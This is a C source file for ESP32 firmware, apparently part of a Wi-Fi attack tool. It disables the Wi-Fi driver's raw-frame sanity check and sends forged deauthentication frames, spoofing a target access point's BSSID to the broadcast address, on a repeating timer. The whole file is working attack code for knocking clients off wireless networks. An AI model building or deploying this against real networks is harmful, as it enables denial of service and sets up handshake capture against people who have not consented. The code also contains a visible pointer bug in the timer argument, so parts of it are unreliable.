/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#include "esp_err.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"

static const char *TAG = "trawler_wsl_bypasser";

static esp_timer_handle_t deauth_timer_handle;

/**
 * @brief Deauthentication frame template
 *
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no
 * longer valid)
 *
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[26] = {
    /*  0 - 1  */ 0xC0,
    0x00, // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00,
    0x00, // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC, // source (ap)
    /* 16 - 21 */ 0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC,
    0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00,
    0x00, // fragment & squence number
    /* 24 - 25 */ 0x01,
    0x02 // reason code (1 = unspecified reason, 2 = invalid authentication)
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation
 * https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

void send_raw_frame(const uint8_t *frame_buffer, int size) {
  ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void send_deauth_frame(const wifi_ap_record_t *ap_record) {
  uint8_t deauth_frame[sizeof(deauth_frame_default)];
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  memcpy(&deauth_frame[10], ap_record->bssid, 6);
  memcpy(&deauth_frame[16], ap_record->bssid, 6);

  send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}

static void timer_send_deauth_frame(void *arg) {
  send_deauth_frame((wifi_ap_record_t *)arg);
}

void wsl_bypasser_init_deauth(const wifi_ap_record_t *ap_record,
                              int deauth_interval_seconds) {
  ESP_LOGI(TAG, "Initializing de-auth and running it every %i seconds",
           deauth_interval_seconds);
  const esp_timer_create_args_t deauth_timer_args = {
      .callback = &timer_send_deauth_frame,
      .arg = (void *)&ap_record,
      .dispatch_method = ESP_TIMER_TASK,
      .name = "deauth_timer",
      .skip_unhandled_events = true,
  };

  ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
  ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle,
                                           deauth_interval_seconds * 1000000));
}

void wsl_bypasser_reset_deauth() {
  ESP_LOGI(TAG, "Resetting de-auth attack");
  ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
  esp_timer_delete(deauth_timer_handle);
}
